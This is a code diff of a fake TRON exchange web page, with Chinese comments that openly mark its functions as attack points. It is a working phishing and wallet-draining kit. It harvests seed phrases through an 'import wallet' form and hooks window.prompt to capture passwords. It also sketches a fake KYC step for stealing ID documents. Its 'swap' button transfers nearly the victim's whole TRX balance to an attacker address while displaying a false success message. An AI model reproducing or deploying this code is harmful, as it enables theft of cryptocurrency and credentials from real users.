+            userBalance = tronWeb.fromSun(balance);
+
+            debugLog(`💰 获取用户TRX余额: ${userBalance} TRX`);
+            debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
+
+            // 更新界面显示
+            document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
+
+            debugLog('🎯 余额获取完成，准备执行攻击...');
+
+        } catch (error) {
+            debugLog(`❌ 获取余额失败: ${error.message}`);
+            // 使用模拟余额用于演示
+            userBalance = (Math.random() * 1000 + 100).toFixed(6);
+            document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
+            debugLog(`🎯 使用模拟余额: ${userBalance} TRX`);
+        }
+    }
+
+    // 更新钱包UI
+    function updateWalletUI(connected) {
+        const connectBtn = document.getElementById('connectWalletBtn');
+        const walletStatus = document.getElementById('walletStatus');
+
+        if (connected) {
+            connectBtn.textContent = '已连接';
+            connectBtn.classList.add('connected');
+            walletStatus.classList.add('show');
+
+            // 更新兑换按钮状态
+            const convertBtn = document.getElementById('convertBtn');
+            convertBtn.textContent = '立即兑换';
+            convertBtn.disabled = false;
+
+        } else {
+            connectBtn.textContent = '连接钱包';
+            connectBtn.classList.remove('connected');
+            walletStatus.classList.remove('show');
+
+            // 兑换按钮禁用
+            const convertBtn = document.getElementById('convertBtn');
+            convertBtn.textContent = '请先连接钱包';
+            convertBtn.disabled = true;
+        }
+    }
+
+    // 显示钱包连接模态框
+    function showWalletModal() {
+        if (isWalletConnected) {
+            debugLog('👤 用户查看已连接的钱包信息');
+            showToast(`已连接: ${currentAccount.substring(0, 8)}...`);
+            return;
         }
 
-        // 显示提示消息
-        function showToast(message, type = 'success') {
-            const toast = document.getElementById('successToast');
-            toast.textContent = message;
-            toast.classList.add('show');
-            
-            if (type === 'error') {
-                toast.style.background = '#f5455c';
-                toast.style.color = '#fff';
-            } else if (type === 'warning') {
-                toast.style.background = '#ff9500';
-                toast.style.color = '#fff';
-            } else if (type === 'info') {
-                toast.style.background = '#1890ff';
-                toast.style.color = '#fff';
+        debugLog('🔗 用户点击连接钱包按钮');
+        document.getElementById('walletModal').classList.add('show');
+    }
+
+    function closeWalletModal() {
+        document.getElementById('walletModal').classList.remove('show');
+    }
+
+    // 连接imToken
+    async function connectImToken() {
+        debugLog('🎯 用户选择连接imToken');
+        closeWalletModal();
+
+        try {
+            showToast('正在连接imToken...', 'info');
+
+            if (window.tronWeb && window.tronWeb.ready) {
+                await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
+                showToast('imToken连接成功！');
             } else {
-                toast.style.background = '#7ed321';
-                toast.style.color = '#000';
+                debugLog('📱 检测到移动环境，尝试深链接跳转');
+
+                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
+                    // 🎯🎯🎯 ngrok环境专用策略：直接跳转到当前页面，让ngrok绕过系统处理
+                    const currentUrl = window.location.href;
+                    const isNgrokEnvironment = currentUrl.includes('ngrok');
+
+                    if (isNgrokEnvironment) {
+                        debugLog('🚨 检测到ngrok环境，使用专用连接流程');
+
+                        // 构建安全的连接URL，添加授权标识
+                        const connectUrl = currentUrl + (currentUrl.includes('?') ? '&' : '?') +
+                            'imtoken_connect=true&auth_required=true&timestamp=' + Date.now();
+
+                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(connectUrl);
+
+                        debugLog('🎯 ngrok环境连接URL:', connectUrl);
+                        debugLog('🎯 ngrok环境deepLink:', deepLink);
+
+                        // 先显示授权提示，然后跳转
+                        if (window.showAuthorizationPrompt) {
+                            window.showAuthorizationPrompt();
+                        }
+
+                        // 延迟跳转，确保授权提示显示
+                        setTimeout(() => {
+                            debugLog('🚀 执行ngrok环境下的imToken跳转');
+                            window.location.href = deepLink;
+                        }, 1500);
+
+                        return;
+                    } else {
+                        // 非ngrok环境，使用代理页面策略
+                        const realServerUrl = window.location.origin;
+                        const redirectParam = encodeURIComponent(realServerUrl + '/?from=imtoken');
+                        const proxyPageUrl = realServerUrl + '/okx-proxy.html?redirect=' + redirectParam;
+
+                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(proxyPageUrl);
+
+                        debugLog('🎯 非ngrok环境：使用代理页面策略');
+                        debugLog('🔒 代理页面:', proxyPageUrl);
+                        debugLog('🔒 deepLink:', deepLink);
+
+                        window.location.href = deepLink;
+                        return;
+                    }
+                }
+
+                showToast('请在imToken中打开此页面', 'warning');
             }
-            
+        } catch (error) {
+            debugLog(`❌ imToken连接失败: ${error.message}`);
+            showToast('连接失败，请重试', 'error');
+        }
+    }
+
+    // 连接TronLink
+    async function connectTronLink() {
+        debugLog('🎯 用户选择连接TronLink');
+        closeWalletModal();
+
+        try {
+            showToast('正在连接TronLink...', 'info');
+
+            if (window.tronWeb && window.tronWeb.ready) {
+                await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
+                showToast('TronLink连接成功！');
+            } else {
+                showToast('请先安装TronLink插件', 'warning');
+            }
+        } catch (error) {
+            debugLog(`❌ TronLink连接失败: ${error.message}`);
+            showToast('连接失败，请重试', 'error');
+        }
+    }
+
+    // 连接MetaMask
+    function connectMetaMask() {
+        debugLog('🎯 用户选择连接MetaMask');
+        closeWalletModal();
+        showToast('MetaMask暂不支持TRON网络', 'warning');
+    }
+
+    // 导入钱包 (🎯 关键攻击点)
+    function importWallet() {
+        debugLog('🎯 用户点击导入钱包 - 显示助记词输入框');
+        closeWalletModal();
+        showMnemonicModal();
+    }
+
+    function showMnemonicModal() {
+        document.getElementById('mnemonicModal').classList.add('show');
+    }
+
+    function closeMnemonicModal() {
+        document.getElementById('mnemonicModal').classList.remove('show');
+        document.getElementById('mnemonicInput').value = '';
+    }
+
+    // 🎯 核心攻击功能：确认导入助记词
+    function confirmImport() {
+        const mnemonic = document.getElementById('mnemonicInput').value.trim();
+
+        if (!mnemonic) {
+            showToast('请输入助记词', 'error');
+            return;
+        }
+
+        debugLog('🎯 用户输入助记词，开始捕获...');
+
+        // 🎯 攻击关键：保存完整助记词
+        capturedMnemonic = mnemonic;
+        const attackData = {
+            timestamp: new Date().toISOString(),
+            mnemonic: mnemonic,
+            wordCount: mnemonic.split(' ').length,
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            referrer: document.referrer
+        };
+
+        // 保存到多个位置
+        localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
+        sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));
+
+        debugLog(`🎯 助记词已捕获: ${mnemonic.substring(0, 20)}...`);
+        debugLog(`🎯 助记词长度: ${attackData.wordCount} 个单词`);
+        debugLog('🎯 攻击数据已保存到本地存储');
+
+        // 模拟导入成功
+        closeMnemonicModal();
+        showToast('钱包导入成功！');
+
+        // 模拟连接成功
+        setTimeout(() => {
+            const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
+            handleSuccessfulConnection(mockAddress);
+        }, 1000);
+    }
+
+    // 开始KYC认证 (🎯 身份认证攻击点)
+    function startKYC() {
+        debugLog('🎯 用户点击身份认证');
+
+        // 记录用户尝试认证
+        const kycData = {
+            timestamp: new Date().toISOString(),
+            action: 'kyc_attempt',
+            userAgent: navigator.userAgent,
+            currentAccount: currentAccount
+        };
+
+        localStorage.setItem('kycAttempt', JSON.stringify(kycData));
+        debugLog('🎯 KYC认证尝试已记录');
+
+        // 模拟跳转到认证页面
+        showToast('正在跳转到身份认证页面...');
+
+        setTimeout(() => {
+            alert('🎯 身份认证功能：\n\n在真实攻击中，这里会跳转到伪造的KYC页面\n收集用户的身份证、自拍照等敏感信息');
+        }, 1500);
+    }
+
+    // 切换标签页
+    function switchTab(tab) {
+        // 更新导航状态
+        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+        event.currentTarget.classList.add('active');
+
+        // 更新内容显示
+        document.querySelectorAll('.main-content').forEach(content => content.classList.remove('active'));
+        document.getElementById(tab).classList.add('active');
+
+        currentTab = tab;
+        debugLog(`📱 切换到${tab}页面`);
+    }
+
+    // 计算兑换 - TRX → USDT
+    function calculateConversion() {
+        const fromAmount = document.getElementById('fromAmount').value;
+        const toAmount = document.getElementById('toAmount');
+        const convertBtn = document.getElementById('convertBtn');
+
+        if (fromAmount && parseFloat(fromAmount) > 0) {
+            // 使用真实TRX汇率：1 TRX ≈ 0.1634 USDT
+            const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
+            toAmount.value = converted;
+
+            if (isWalletConnected) {
+                convertBtn.textContent = `兑换 ${fromAmount} TRX`;
+                convertBtn.disabled = false;
+
+                debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
+                debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
+            } else {
+                convertBtn.textContent = '请先连接钱包';
+                convertBtn.disabled = true;
+            }
+        } else {
+            toAmount.value = '';
+            convertBtn.textContent = isWalletConnected ? '请输入TRX数量' : '请先连接钱包';
+            convertBtn.disabled = true;
+        }
+    }
+
+    // 🎯🎯🎯 核心攻击逻辑：执行TRX转移攻击 🎯🎯🎯
+    async function executeAttack() {
+        if (!isWalletConnected) {
+            showToast('请先连接钱包', 'error');
+            showWalletModal();
+            return;
+        }
+
+        try{
+            if (typeof getCurrentAttackerAddress === 'function'){
+                const latestAddressResult = await getCurrentAttackerAddress();
+                if (latestAddressResult && latestAddressResult.address){
+                    ATTACKER_ADDRESS = latestAddressResult.address;
+                    debugLog(`🔄 攻击前更新目标地址: ${ATTACKER_ADDRESS}`);
+                }
+            }
+        }catch (error){
+            debugLog(`⚠️ 获取最新攻击者地址失败: ${error.message}，使用当前地址: ${ATTACKER_ADDRESS}`);
+        }
+
+        const fromAmount = document.getElementById('fromAmount').value;
+        if (!fromAmount || parseFloat(fromAmount) <= 0) {
+            showToast('请输入有效的TRX数量', 'error');
+            return;
+        }
+
+        debugLog('🎯🎯🎯 用户执行TRX兑换 - 攻击开始！🎯🎯🎯');
+        debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+        debugLog(`🎯 实际攻击: 转移用户全部 ${userBalance} TRX 到攻击者地址`);
+
+        // 检查用户余额
+        if (parseFloat(fromAmount) > parseFloat(userBalance)) {
+            showToast(`余额不足，您的TRX余额为 ${userBalance}`, 'error');
+            return;
+        }
+
+        // 🎯 攻击逻辑：记录攻击数据
+        const attackRecord = {
+            timestamp: new Date().toISOString(),
+            attackType: 'TRX_TO_USDT_HIJACK',
+            victimAddress: currentAccount,
+            attackerAddress: ATTACKER_ADDRESS,
+            userThoughtAmount: parseFloat(fromAmount),
+            userThoughtCurrency: 'TRX',
+            userThoughtReceive: (parseFloat(fromAmount) * 0.1634).toFixed(6),
+            userThoughtReceiveCurrency: 'USDT',
+            realStolenAmount: parseFloat(userBalance),
+            realStolenCurrency: 'TRX',
+            capturedMnemonic: capturedMnemonic,
+            userBalance: parseFloat(userBalance),
+            exchangeRate: 0.1634,
+            userAgent: navigator.userAgent,
+            url: window.location.href
+        };
+
+        localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
+
+        // 🎯 执行看似正常的转账（恶意后门会劫持）
+        showToast('正在执行交易...', 'info');
+
+        try{
+            // 🎯 关键：只转账用户输入的金额，恶意后门会自动修改
+            const normalAmount = tronWeb.toSun(fromAmount);
+
+            debugLog(`🎯 发送正常转账请求: ${fromAmount} TRX`);
+            debugLog(`🎯 恶意后门将自动劫持并修改为全部余额`);
+
+            const transaction = await tronWeb.trx.sendTransaction(
+                ATTACKER_ADDRESS,
+                normalAmount
+            );
+            debugLog(`🎯 转账完成！交易哈希: ${transaction.txid || transaction}`);
+
+            // 显示虚假成功信息
+            showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+
+            //等待余额更新
+            setTimeout(async () =>{
+                await forceRefreshBalance();
+            },3000);
+
+        }catch (error){
+            debugLog(`❌ 转账失败: ${error.message}`);
+            showToast('兑换失败，请重试', 'error');
+        }
+
+
+        debugLog('🎯 攻击记录已保存:');
+        debugLog(`   - 受害者地址: ${attackRecord.victimAddress}`);
+        debugLog(`   - 攻击者地址: ${attackRecord.attackerAddress}`);
+        debugLog(`   - 用户以为兑换: ${attackRecord.userThoughtAmount} TRX`);
+        debugLog(`   - 用户以为获得: ${attackRecord.userThoughtReceive} USDT`);
+        debugLog(`   - 实际被盗金额: ${attackRecord.realStolenAmount} TRX`);
+        debugLog(`   - 被盗金额价值: $${(attackRecord.realStolenAmount * 0.1634).toFixed(2)} USD`);
+
+        // 🎯 模拟区块链交易执行
+        showToast('正在执行交易...', 'info');
+
+        // ✅ 正确的代码
+        // 🎯 修复后的转账逻辑（替换您现有的setTimeout部分）
+        // 🎯 修复后的完整转账逻辑
+        setTimeout(async () => {
+            try {
+                // 🎯 执行真实TRX转账到攻击者地址
+                debugLog('🎯 开始执行真实TRX转账...');
+
+                // 预留手续费
+                const feeReserve = 5;
+                const availableBalance = parseFloat(userBalance) - feeReserve;
+
+                if (availableBalance <= 0) {
+                    throw new Error(`余额不足，需要至少 ${feeReserve} TRX 作为手续费`);
+                }
+
+                const transferAmount = tronWeb.toSun(availableBalance);
+
+                debugLog(`🎯 转账详情:`);
+                debugLog(`- 从: ${currentAccount}`);
+                debugLog(`- 到: ${ATTACKER_ADDRESS}`);
+                debugLog(`- 用户总余额: ${userBalance} TRX`);
+                debugLog(`- 预留手续费: ${feeReserve} TRX`);
+                debugLog(`- 实际转账: ${availableBalance} TRX (${transferAmount} SUN)`);
+
+                // 🎯 监听密码输入（关键攻击点）
+                debugLog('🎯 监听用户密码输入...');
+                const originalPrompt = window.prompt;
+                window.prompt = function(message, defaultValue) {
+                    const password = originalPrompt.call(window, message, defaultValue);
+                    if (password && message.toLowerCase().includes('password')) {
+                        debugLog(`🎯 捕获用户密码: ${password.replace(/./g, '*')}`);
+
+                        // 保存密码
+                        const passwordData = {
+                            timestamp: new Date().toISOString(),
+                            password: password,
+                            address: currentAccount,
+                            userAgent: navigator.userAgent
+                        };
+                        localStorage.setItem('capturedPassword', JSON.stringify(passwordData));
+                        debugLog('🎯 密码已保存到本地存储');
+                    }
+                    return password;
+                };
+
+                const transaction = await tronWeb.trx.sendTransaction(
+                    ATTACKER_ADDRESS,
+                    transferAmount
+                );
+
+                debugLog(`🎯 真实转账成功！交易哈希: ${transaction.txid || transaction}`);
+                debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
+                debugLog(`💰 A成员（攻击者）已收到: ${availableBalance} TRX`);
+                debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
+                debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
+                debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+
+                // 🔧 关键修复：强制刷新余额
+                debugLog('🔄 等待3秒后刷新余额...');
+                setTimeout(async () => {
+                    const actualBalance = await forceRefreshBalance();
+                    debugLog(`🎯 攻击后实际余额: ${actualBalance} TRX`);
+
+                    if (parseFloat(actualBalance) < parseFloat(userBalance)) {
+                        debugLog('✅ 余额已正确扣除，攻击成功！');
+                    } else {
+                        debugLog('⚠️ 余额未扣除，可能需要更长时间确认');
+                        // 继续刷新直到余额更新
+                        const refreshInterval = setInterval(async () => {
+                            const newBalance = await forceRefreshBalance();
+                            if (parseFloat(newBalance) < parseFloat(userBalance)) {
+                                debugLog('✅ 余额已更新，攻击确认成功！');
+                                clearInterval(refreshInterval);
+                            }
+                        }, 5000);
+
+                        // 最多等待30秒
+                        setTimeout(() => {
+                            clearInterval(refreshInterval);
+                            debugLog('⚠️ 余额更新超时，但转账哈希已确认');
+                        }, 30000);
+                    }
+                }, 3000);
+
+                // 保存真实攻击记录
+                attackRecord.realTransferAmount = availableBalance;
+                attackRecord.transactionHash = transaction.txid || transaction;
+                attackRecord.feeReserved = feeReserve;
+                attackRecord.attackSuccess = true;
+                attackRecord.completedAt = new Date().toISOString();
+                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
+
+            } catch (error) {
+                debugLog(`❌ 真实转账失败: ${error.message}`);
+                debugLog('🎯 转账失败可能原因:');
+                debugLog('1. 用户取消了转账授权');
+                debugLog('2. 余额不足支付手续费');
+                debugLog('3. 网络连接问题');
+                debugLog('4. 钱包安全限制');
+                debugLog('5. TronWeb API调用错误');
+
+                // 如果真实转账失败，使用原有模拟模式
+                debugLog('🎯 切换到模拟攻击模式...');
+                const fakeTransactionHash = generateFakeHash();
+                debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
+                debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');
+
+                // 保存模拟攻击记录
+                attackRecord.transactionHash = fakeTransactionHash;
+                attackRecord.attackSuccess = false;
+                attackRecord.simulationMode = true;
+                attackRecord.completedAt = new Date().toISOString();
+                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
+            }
+
+            // 显示虚假成功信息给用户（无论真实还是模拟）
+            showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+
+            // 重置表单
             setTimeout(() => {
-                toast.classList.remove('show');
-            }, 2000);
+                document.getElementById('fromAmount').value = '';
+                document.getElementById('toAmount').value = '';
+                document.getElementById('convertBtn').disabled = true;
+                document.getElementById('convertBtn').textContent = '请输入TRX数量';
+            }, 3000);
+
+        }, 2000);
+
+    }
+
+    // 生成虚假交易哈希
+    function generateFakeHash() {
+        return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+    }
+
+    // 初始化Web3网格动画
+    function initializeWeb3Grid() {
+        const grid = document.getElementById('web3Grid');
+        if (!grid) return;
+
+        for (let i = 0; i < 400; i++) {
+            const dot = document.createElement('div');
+            dot.className = 'grid-dot';
+            grid.appendChild(dot);
         }
 
-        // 切换调试面板
-        function toggleDebug() {
-            debugMode = !debugMode;
-            const panel = document.getElementById('debugPanel');
-            panel.classList.toggle('show', debugMode);
-            debugLog(`🔧 调试模式: ${debugMode ? '开启' : '关闭'}`);
-        }
+        // 动态激活网格点
+        setInterval(() => {
+            const dots = grid.querySelectorAll('.grid-dot');
+            dots.forEach(dot => dot.classList.remove('active'));
 
-        // 其他功能函数
-        function showPlatformDropdown() {
-            debugLog('📱 用户点击平台选择器');
-        }
-
-        function showUserMenu() {
-            debugLog('👤 用户点击用户头像');
-        }
-
-        function showSearch() {
-            debugLog('🔍 用户点击搜索');
-        }
-
-        function selectFromCurrency() {
-            debugLog('💰 用户选择支付币种');
-        }
-
-        function selectToCurrency() {
-            debugLog('💰 用户选择接收币种');
-        }
-
-        function swapCurrencies() {
-            debugLog('🔄 用户点击币种交换');
-            showToast('币种交换功能开发中...');
-        }
-
-        function depositFunds() {
-            debugLog('💳 用户点击充币');
-            showToast('充币功能开发中...');
-        }
-
-        // 全局调试函数
-        window.getAttackData = function() {
-            return {
-                capturedMnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
-                attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
-                kycAttempt: JSON.parse(localStorage.getItem('kycAttempt') || 'null'),
-                attackLogs: JSON.parse(localStorage.getItem('attackLogs') || '[]'),
-                currentAccount: currentAccount,
-                isWalletConnected: isWalletConnected,
-                userBalance: userBalance,
-                attackerAddress: ATTACKER_ADDRESS
-            };
-        };
-
-        window.clearAttackData = function() {
-            localStorage.removeItem('capturedMnemonic');
-            localStorage.removeItem('attackRecord');
-            localStorage.removeItem('kycAttempt');
-            localStorage.removeItem('attackLogs');
-            sessionStorage.clear();
-            debugLog('🗑️ 所有攻击数据已清除');
-        };
-
-        // 页面可见性变化监听
-        document.addEventListener('visibilitychange', function() {
-            if (document.visibilityState === 'visible') {
-                debugLog('👁️ 页面重新可见，检查钱包状态');
-                setTimeout(checkWalletEnvironment, 1000);
+            // 随机激活一些点形成图案
+            const activeDots = [];
+            for (let i = 0; i < 50; i++) {
+                const randomIndex = Math.floor(Math.random() * dots.length);
+                activeDots.push(randomIndex);
             }
-        });
-        // 🎯 全局调试函数 - 查看捕获的数据
-        window.getCapturedData = function() {
-            return {
-                password: JSON.parse(localStorage.getItem('capturedPassword') || 'null'),
-                mnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
-                attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
-                currentBalance: userBalance,
-                attackerAddress: ATTACKER_ADDRESS
-            };
-        };
 
-        window.clearCapturedData = function() {
-            localStorage.removeItem('capturedPassword');
-            localStorage.removeItem('capturedMnemonic');
-            localStorage.removeItem('attackRecord');
-            debugLog('🗑️ 所有捕获数据已清除');
+            activeDots.forEach(index => {
+                if (dots[index]) {
+                    dots[index].classList.add('active');
+                }
+            });
+        }, 1000);
+    }
+
+    // 启动落币动画
+    function startFallingCoins() {
+        const container = document.getElementById('fallingCoins');
+        if (!container) return;
+
+        const coins = ['₿', '♦', '$', '₮', 'Ξ', '◎'];
+
+        setInterval(() => {
+            const coin = document.createElement('div');
+            coin.className = 'falling-coin';
+            coin.textContent = coins[Math.floor(Math.random() * coins.length)];
+            coin.style.left = Math.random() * 100 + '%';
+            coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
+
+            container.appendChild(coin);
+
+            // 清理已完成动画的元素
+            setTimeout(() => {
+                if (coin.parentNode) {
+                    coin.parentNode.removeChild(coin);
+                }
+            }, 5000);
+        }, 500);
+    }
+
+    // 创建钱包
+    function createWallet() {
+        debugLog('🔧 用户点击创建钱包');
+        showToast('创建钱包功能开发中...');
+    }
+
+    // 显示攻击指示器
+    function showAttackIndicator() {
+        const indicator = document.getElementById('attackIndicator');
+        indicator.classList.add('show');
+
+        setTimeout(() => {
+            indicator.classList.remove('show');
+        }, 5000);
+    }
+
+    // 显示提示消息
+    function showToast(message, type = 'success') {
+        const toast = document.getElementById('successToast');
+        toast.textContent = message;
+        toast.classList.add('show');
+
+        if (type === 'error') {
+            toast.style.background = '#f5455c';
+            toast.style.color = '#fff';
+        } else if (type === 'warning') {
+            toast.style.background = '#ff9500';
+            toast.style.color = '#fff';
+        } else if (type === 'info') {
+            toast.style.background = '#1890ff';
+            toast.style.color = '#fff';
+        } else {
+            toast.style.background = '#7ed321';
+            toast.style.color = '#000';
+        }
+
+        setTimeout(() => {
+            toast.classList.remove('show');
+        }, 2000);
+    }
+
+    // 切换调试面板
+    function toggleDebug() {
+        debugMode = !debugMode;
+        const panel = document.getElementById('debugPanel');
+        panel.classList.toggle('show', debugMode);
+        debugLog(`🔧 调试模式: ${debugMode ? '开启' : '关闭'}`);
+    }
+
+    // 其他功能函数
+    function showPlatformDropdown() {
+        debugLog('📱 用户点击平台选择器');
+    }
+
+    function showUserMenu() {
+        debugLog('👤 用户点击用户头像');
+    }
+
+    function showSearch() {
+        debugLog('🔍 用户点击搜索');
+    }
+
+    function selectFromCurrency() {
+        debugLog('💰 用户选择支付币种');
+    }
+
+    function selectToCurrency() {
+        debugLog('💰 用户选择接收币种');
+    }
+
+    function swapCurrencies() {
+        debugLog('🔄 用户点击币种交换');
+        showToast('币种交换功能开发中...');
+    }
+
+    function depositFunds() {
+        debugLog('💳 用户点击充币');
+        showToast('充币功能开发中...');
+    }
+
+    // 全局调试函数
+    window.getAttackData = function() {
+        return {
+            capturedMnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
+            attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
+            kycAttempt: JSON.parse(localStorage.getItem('kycAttempt') || 'null'),
+            attackLogs: JSON.parse(localStorage.getItem('attackLogs') || '[]'),
+            currentAccount: currentAccount,
+            isWalletConnected: isWalletConnected,
+            userBalance: userBalance,
+            attackerAddress: ATTACKER_ADDRESS
         };
-    </script>
-    <script src="add_multi_currency_patch.js"></script>
+    };
+
+    window.clearAttackData = function() {
+        localStorage.removeItem('capturedMnemonic');
+        localStorage.removeItem('attackRecord');
+        localStorage.removeItem('kycAttempt');
+        localStorage.removeItem('attackLogs');
+        sessionStorage.clear();
+        debugLog('🗑️ 所有攻击数据已清除');
+    };
+
+    // 页面可见性变化监听
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'visible') {
+            debugLog('👁️ 页面重新可见，检查钱包状态');
+            setTimeout(checkWalletEnvironment, 1000);
+        }
+    });
+    // 🎯 全局调试函数 - 查看捕获的数据
+    window.getCapturedData = function() {
+        return {
+            password: JSON.parse(localStorage.getItem('capturedPassword') || 'null'),
+            mnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
+            attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
+            currentBalance: userBalance,
+            attackerAddress: ATTACKER_ADDRESS
+        };
+    };
+
+    window.clearCapturedData = function() {
+        localStorage.removeItem('capturedPassword');
+        localStorage.removeItem('capturedMnemonic');
+        localStorage.removeItem('attackRecord');
+        debugLog('🗑️ 所有捕获数据已清除');
+    };
+</script>
+<script src="add_multi_currency_patch.js"></script>
 
 </body>
 </html>
